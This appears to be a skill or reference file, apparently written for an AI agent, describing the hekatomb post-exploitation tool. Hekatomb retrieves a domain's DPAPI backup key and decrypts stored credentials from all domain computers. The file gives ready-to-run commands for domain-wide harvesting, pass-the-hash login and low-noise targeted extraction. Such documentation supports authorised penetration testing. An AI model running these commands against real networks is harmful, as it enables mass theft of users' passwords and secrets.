---
name: hekatomb
description: Extract and decrypt DPAPI secrets and credentials from all domain computers by leveraging Domain Backup Keys. It automates LDAP enumeration of users and computers, retrieves backup keys via RPC, and downloads/decrypts DPAPI blobs from the network. Use during post-exploitation or internal penetration tests when Domain Admin (or equivalent) privileges are obtained to harvest widespread cleartext credentials.
---

# hekatomb

## Overview
Hekatomb is a post-exploitation tool that connects to an LDAP directory to retrieve information on all domain computers and users. It then automates the extraction of the Domain Controller's private backup key to decrypt DPAPI (Data Protection API) blobs collected from across the network, revealing passwords and secrets stored in Windows Credential Manager. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume hekatomb is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install hekatomb
```

## Common Workflows

### Standard Domain-wide Extraction
Extract and decrypt credentials from all reachable computers using domain administrator credentials:
```bash
hekatomb project.local/administrator:Password123!@10.0.0.1
```

### Using NTLM Hashes
Authenticate without a cleartext password using the NTLM hash:
```bash
hekatomb -hashes :aad3b435b51404eeaad3b435b51404ee:5fbc3a433ca3d231266530517d6821ca project.local/administrator@10.0.0.1
```

### Targeted Extraction
Focus on a specific user and computer to minimize noise or save time:
```bash
hekatomb -just-user "jdoe" -just-computer "WORKSTATION01" project.local/administrator@10.0.0.1
```

### Using a Pre-extracted Backup Key
If you already have the domain backup key (.pvk), use it to decrypt blobs:
```bash
hekatomb -pvk domain_backup.pvk project.local/administrator@10.0.0.1
```

## Complete Command Reference

```bash
hekatomb [options] target
```

### Positional Arguments
| Argument | Description |
|----------|-------------|
| `target` | Target DC in format: `[[domain/]username[:password]@]<targetName or address of DC>` |

### Authentication Options
| Flag | Description |
|------|-------------|
| `-hashes LMHASH:NTHASH` | NTLM hashes for authentication (format: `LMHASH:NTHASH`) |
| `-pvk PVK` | Path to a Domain backup keys file (.pvk) |

### Execution Options
| Flag | Description |
|------|-------------|
| `-dns DNS` | DNS server IP address to resolve computer hostnames |
| `-port [port]` | Specify port to connect to SMB Server (default is 445) |
| `-smb2` | Force the use of the SMBv2 protocol |
| `-just-user JUST_USER` | Test only the specified username |
| `-just-computer JUST_COMPUTER` | Test only the specified computer |
| `-md5` | Print MD5 hashes instead of cleartext passwords |

### Verbosity and Output
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-csv` | Export results to a CSV file |
| `-debug` | Turn DEBUG output ON |
| `-debugmax` | Turn DEBUG output to maximum level |

## Notes
- **Privileges**: This tool typically requires Domain Admin privileges (or rights to retrieve the Domain Backup Key) to function effectively across the entire domain.
- **Network Access**: The tool requires SMB access to the target computers and RPC/LDAP access to the Domain Controller.
- **DPAPI**: Decrypts secrets including Chrome/Edge passwords, WiFi keys, and Windows Vault credentials.